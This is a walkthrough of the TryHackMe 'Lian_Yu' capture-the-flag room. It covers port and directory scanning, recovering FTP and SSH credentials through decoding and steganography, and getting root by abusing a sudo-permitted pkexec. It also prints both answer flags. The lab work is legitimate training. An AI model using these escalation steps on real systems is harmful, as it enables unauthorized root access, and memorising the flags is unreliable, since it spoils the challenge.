# Lian_Yu

Laurent Chauvin | November 02, 2022

## Resources

[1] https://gtfobins.github.io/

## Progress

```
export IP=10.10.239.189
```

Nmap scan
```
nmap -sC -sV -oN nmap/initial $IP
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-02 03:37 EDT
Nmap scan report for 10.10.239.189
Host is up (0.11s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT      STATE    SERVICE VERSION
21/tcp    open     ftp     vsftpd 3.0.2
22/tcp    open     ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey: 
|   1024 56:50:bd:11:ef:d4:ac:56:32:c3:ee:73:3e:de:87:f4 (DSA)
|   2048 39:6f:3a:9c:b6:2d:ad:0c:d8:6d:be:77:13:07:25:d6 (RSA)
|   256 a6:69:96:d7:6d:61:27:96:7e:bb:9f:83:60:1b:52:12 (ECDSA)
|_  256 3f:43:76:75:a8:5a:a6:cd:33:b0:66:42:04:91:fe:a0 (ED25519)
80/tcp    open     http    Apache httpd
|_http-title: Purgatory
|_http-server-header: Apache
111/tcp   open     rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          38183/tcp   status
|   100024  1          44097/tcp6  status
|   100024  1          55259/udp6  status
|_  100024  1          55700/udp   status
14441/tcp filtered unknown
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.36 seconds
```

Gobuster scan
```
gobuster dir -u $IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee gobuster.log  

===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.239.189
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2022/11/02 03:39:55 Starting gobuster in directory enumeration mode
===============================================================
/island               (Status: 301) [Size: 236] [--> http://10.10.239.189/island/]
```

Nikto scan
```
nikto -h "http://$IP" | tee nikto.log

- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.239.189
+ Target Hostname:    10.10.239.189
+ Target Port:        80
+ Start Time:         2022-11-02 03:38:54 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /, inode: 9ca, size: 5a47e9947b000, mtime: gzip
+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7889 requests: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2022-11-02 03:54:01 (GMT-4) (907 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Going to 'http://$IP/island' reveal
```
Ohhh Noo, Don't Talk...............

I wasn't Expecting You at this Moment. I will meet you there

You should find a way to Lian_Yu as we are planed. The Code Word is:
vigilante
```

Running another gobuster scan on '/island'
```
gobuster dir -u $IP/island -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee gobuster.log
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.239.189/island
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2022/11/02 03:50:43 Starting gobuster in directory enumeration mode
===============================================================
/2100                 (Status: 301) [Size: 241] [--> http://10.10.239.189/island/2100/]
```

In source of '/island/2100/'
```
<!-- you can avail your .ticket here but how?   -->
```

Starting another gobuster on '/island/2100' with the ```-x ticket``` option as it seems we are looking for a .ticket file
```
gobuster dir -u $IP/island/2100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x ticket | tee gobuster.log

===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.239.189/island/2100
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Extensions:              ticket
[+] Timeout:                 10s
===============================================================
2022/11/02 04:00:47 Starting gobuster in directory enumeration mode
===============================================================
/green_arrow.ticket   (Status: 200) [Size: 71]
```

Going to 'http://$IP/island/2100/green_arrow.ticket' reveal
```
This is just a token to get into Queen's Gambit(Ship)


RTy8yhBQdscX
```

This seems encoded. Let's fire up CyberChief. After testing different methods, I found a base58 to work
```
!#th3h00d
```

As stated in the challenge, this is a FTP password.
Using 'vigilante' as username and '!#th3h00d' as password, got ftp access.
```
ftp $IP
Connected to 10.10.239.189.
220 (vsFTPd 3.0.2)
Name (10.10.239.189:kali): vigilante
331 Please specify the password.
Password: !#th3h00d
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||35835|).
150 Here comes the directory listing.
-rw-r--r--    1 0        0          511720 May 01  2020 Leave_me_alone.png
-rw-r--r--    1 0        0          549924 May 05  2020 Queen's_Gambit.png
-rw-r--r--    1 0        0          191026 May 01  2020 aa.jpg
226 Directory send OK.
```

It seems 'Leave_me_alone.png' cannot open, with a header starting with 58 45 (Could not find what this is).
Try to fix it to PNG (first 8 bytes: 89 50 4e 47 0d 0a 1a 0a).

```
hexedit Leave_me_alone.png
```

Fixing the first 8 bytes, then F2 to save file.

Opening it says
```
Just Leave me a lone, Here take it what you want: password
```

Password for steghide 'aa.jpg', but could also be found using ```stegseek```
```
stegseek aa.jpg /opt/rockyou.txt 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "password"
[i] Original filename: "ss.zip".
[i] Extracting to "aa.jpg.out".
```

```stegseek``` also reveal this is .zip file.

Extracting it reveal 2 files 'passwd.txt' and 'shado'

```
cat passwd.txt

This is your visa to Land on Lian_Yu # Just for Fun ***


a small Note about it


Having spent years on the island, Oliver learned how to be resourceful and 
set booby traps all over the island in the common event he ran into dangerous
people. The island is also home to many animals, including pheasants,
wild pigs and wolves.
```

```
cat shado

M3tahuman
```

From the challenge, it seems the password in 'shado' is for SSH.

Let's try to connect.

A reverse search on the image 'aa.jpg' reveal the name of the character 'Slade Wilson' (I had to look for the solution to this, very far fetched.)

We can connect using the username 'slade' and password 'M3tahuman'.

Let's get the flag
```
cat user.txt 

THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
                        --Felicity Smoak
```

Time to privesc.
```
slade@LianYu:~$ sudo -l
[sudo] password for slade: 
Matching Defaults entries for slade on LianYu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User slade may run the following commands on LianYu:
    (root) PASSWD: /usr/bin/pkexec
```

GTFObins 'pkexec'
```
If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

sudo pkexec /bin/sh
```
```
slade@LianYu:~$ sudo /usr/bin/pkexec /bin/bash
root@LianYu:~# whoami
root
```

Let's get root flag
```
cat /root/root.txt 

Mission accomplished


You are injected me with Mirakuru:) ---> Now slade Will become DEATHSTROKE. 



THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
                                                                              --DEATHSTROKE

Let me know your comments about this machine :)
I will be available @twitter @User6825


```

## Flag

1. User

```
THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
```

2. Privesc

```
THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
```

## To Go Further

This room is pretty far fetched, and I often found myself stuck without knowing what to do, even when getting new infos.
